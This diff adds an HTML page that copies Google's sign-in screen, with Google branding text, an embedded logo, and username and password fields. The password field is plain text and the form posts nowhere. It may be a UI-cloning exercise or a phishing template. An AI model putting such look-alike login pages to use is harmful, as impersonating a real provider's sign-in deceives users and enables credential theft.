@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Document</title>
+    <style>
+body {
+    margin: 0;
+    padding: 0;
+    background-size: cover;
+    font-family: sans-serif;
+  }
+  
+  .box {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    width: 25rem;
+    padding: 2.5rem;
+    box-sizing: border-box;
+    border: 1px solid #dadce0;
+    -webkit-border-radius: 8px;
+    border-radius: 8px;
+
+  }
+  
+  .box h2 {
+    margin: 0px 0 -0.125rem;
+    padding: 0;
+    color: #fff;
+    text-align: center;
+    color: #202124;
+    font-family: 'Google Sans','Noto Sans Myanmar UI',arial,sans-serif;
+    font-size: 24px;
+    font-weight: 400;
+  }
+
+  .box p {
+    font-size: 16px;
+    font-weight: 400;
+    letter-spacing: .1px;
+    line-height: 1.5;
+    margin-bottom: 25px;
+    text-align: center;
+  }
+  
+  .box .inputBox {
+    position: relative;
+  }
+  
+  .box .inputBox input {
+    width: 93%;
+    padding: 0.625rem 10px;
+    font-size: 1rem;
+    letter-spacing: 0.062rem;
+    margin-bottom: 1.875rem;
+    border: 1px solid #ccc;
+    background: transparent;
+    border-radius: 4px;
+    
+  }
+  
+  .box .inputBox label {
+    position: absolute;
+    top: 0;
+    left: 10px;
+    padding: 0.625rem 0;
+    font-size: 1rem;
+    color: grey;
+    pointer-events: none;
+    transition: 0.5s;
+  }
+  
+  .box .inputBox input:focus ~ label,
+  .box .inputBox input:valid ~ label,
+  .box .inputBox input:not([value=""]) ~ label {
+    top: -1.125rem;
+    left: 10px;
+    color: #1a73e8;
+    font-size: 0.75rem;
+    background-color: white;
+    height: 10px;
+    padding-left: 5px;
+    padding-right: 5px;
+  }
+  .box .inputBox input:focus {
+    outline: none;
+    border: 2px solid #1a73e8;
+  }
+  .box input[type="submit"] {
+    border: none;
+    outline: none;
+    color: #fff;
+    background-color: #1a73e8;
+    padding: 0.625rem 1.25rem;
+    cursor: pointer;
+    border-radius: 0.312rem;
+    font-size: 1rem;
+    float: right;
+  }
+  
+  .box input[type="submit"]:hover {
+    background-color: #287ae6;
+    box-shadow: 0 1px 1px 0 rgba(66,133,244,0.45), 0 1px 3px 1px rgba(66,133,244,0.3);
+  }
+  
+</style>
+</head>
+<body>
+        <div class="box">
+	<p align=center><img align="center" src="data:image/png;base64,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"></p>
+                <h2>Sign in</h2>
+                <p>Use your Google Account</p>
+                <form>
+                  <div class="inputBox">
+                    <input type="email" name="username" required onkeyup="this.setAttribute('value', this.value);"  value="">
+         <label>Username</label>
+                              
+      </div>
+                  <div class="inputBox">
+                        <input type="text" name="text" required onkeyup="this.setAttribute('value', this.value);" value="">
+                        <label>Password</label>
+                      </div>
+<font color=white>
+                  <input type="submit" name="sign-in" value="Sign In">
+</font>
+                </form>
+              </div>
+</body>
+</html>
